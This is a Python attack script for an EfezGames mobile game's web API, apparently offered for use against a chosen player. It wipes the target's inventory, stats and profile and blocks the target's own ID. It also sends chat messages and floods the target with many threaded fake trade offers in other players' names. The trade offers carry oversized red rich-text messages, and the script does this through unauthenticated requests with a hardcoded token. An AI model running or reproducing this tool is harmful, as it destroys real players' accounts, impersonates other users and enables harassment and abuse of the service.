import requests
import random
from concurrent.futures import ThreadPoolExecutor

PRICESHASH = "fbd9aec4384456124c0765581a4ba099"

def nuke(iD, mesa, tradesCount: int, channel="US"):
    def send_message(id, text, channel):
        req = "https://api.efezgames.com/v1/social/sendChat?playerID={ID}&token={token}&message={msg}&chan={chan}"
        request = req.format(ID=id,
                             token="01122",
                             msg=text,
                             chan=channel)
        response = requests.get(request)
        print(response.text)

    message_text = mesa
    target = iD
    ids = []

    with open("Allids.txt", "r") as file:
        for line in file:
            line = line.strip()
            if line and not line.startswith('Player IDs') and not line.startswith('✓') and not line.startswith('Sent'):
                ids.append(line)

    print(f"Loaded {len(ids)} IDs from Allids.txt")
    send_message(target, "Bamboozle", channel)

    def trades(sender_id, receiver_id, m):
        msg = "<size=100><voffset=100><pos=0><color=red>" + message_text[m]

        skin = "HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00HN00"

        req = "https://api.efezgames.com/v1/trades/createOffer?token={TOKEN}&playerID={PLAYERID}&receiverID={RECEIVERID}&senderNick={SENDERNICK}&senderFrame={SENDERFRAME}&senderAvatar={SENDERAVATAR}&receiverNick={RECEIVERNICK}&receiverFrame={RECEIVERFRAME}&receiverAvatar={RECEIVERAVATAR}&skinsOffered={SKINSOFFERED}&skinsRequested={SKINSREQUESTED}&message={MESSAGE}&pricesHash={PRICESHASH}&senderOneSignal=a27b79ec-f206-4022-b12f-260855743091&receiverOneSignal=1621a4af-03a2-4fcf-976c-d68c021460c8&senderVersion=2.31.0&receiverVersion=2.31.0"

        request = req.format(TOKEN="01122",
                             PLAYERID=sender_id,
                             RECEIVERID=receiver_id,
                             SENDERNICK="NukeBot",
                             SENDERFRAME="lP",
                             SENDERAVATAR="yB",
                             RECEIVERNICK="YOU",
                             RECEIVERFRAME="aa",
                             RECEIVERAVATAR="aa",
                             SKINSOFFERED=skin,
                             SKINSREQUESTED=skin,
                             PRICESHASH=PRICESHASH,
                             MESSAGE=msg)
        response = requests.get(request)
        return response

    def clearAcc(targetId):
        req = "https://api.efezgames.com/v1/equipment/sendEQ"
        myobj = {
            "playerID": targetId,
            "version": "hui",
            "data": "0;0;0;0;0;0;0;0;0;0;0",
            "eqdata": "0"*32,
            "stats": "1:0,2:0,3:0,4:0,5:0,6:0.00,7:0.00,8:0,9:0,11:0,13:0,15:0.00,16:0.00,17:0.00,18:0,19:0,20:0,23:0,24:0,25:0,27:0,28:0,30:0,31:0,33:0,34:0,36:0,38:0,39:0,40:0,41:0,42:0",
            "blockedUsers": targetId,
            "description": "<color=red><size=100>rip",
            "token": "01122",
        }
        r = requests.post(url=req, data=myobj)
        print(r.text)

    clearAcc(target)

    successful_trades = 0

    with ThreadPoolExecutor(max_workers=10) as executor:
        for i in range(tradesCount):
            futures = []
            for j in range(10):
                random_id = random.choice(ids)
                futures.append(executor.submit(trades, random_id, target, j % len(message_text)))

            for future in futures:
                try:
                    response = future.result()
                    print(response.text)
                    if response.json().get("success", False):
                        successful_trades += 1
                    else:
                        print("Trade failed, retrying...")
                except Exception as e:
                    print(f"An error occurred: {e}")

    print(str(successful_trades) + " successful trades!")
    clearAcc(target)
    send_message(target, "rip", channel)

target = input("Type nuke target ID: ")
count = int(input("Type number of trades: "))
channel_input = input("Type channel to send nuke results (can be skipped, default US): ")
channel = channel_input if channel_input else "US"

nuke(target, "rip", count // 10, channel)